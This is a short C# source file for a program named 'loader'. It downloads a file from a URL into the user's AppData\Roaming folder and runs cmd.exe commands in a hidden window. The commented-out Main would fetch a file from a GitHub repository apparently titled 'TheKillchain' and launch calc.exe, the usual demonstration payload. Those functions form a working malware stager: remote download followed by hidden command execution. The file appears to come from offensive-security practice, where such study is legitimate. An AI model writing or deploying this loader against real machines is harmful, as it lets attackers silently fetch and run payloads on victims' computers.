using System;
using System.Net;

namespace loader {
    public class Program {
    
        public static void GetFile(string url, string filename) {
            string currentUser = Environment.UserName;
            string downloadPath = @$"C:\Users\{currentUser}\AppData\Roaming\{filename}";
            using(WebClient myWebClient = new WebClient()) {
                
                myWebClient.DownloadFile(url, downloadPath);
            }
        }

        public static void RunCommand(string command) {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = command;
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void Main(string[] args) {
            //string file = "test.json";
            //string fileLocation = "https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json";
            //GetFile(fileLocation, file);

            //string command = "/c calc.exe";
            //RunCommand(command);
        }


    }
}
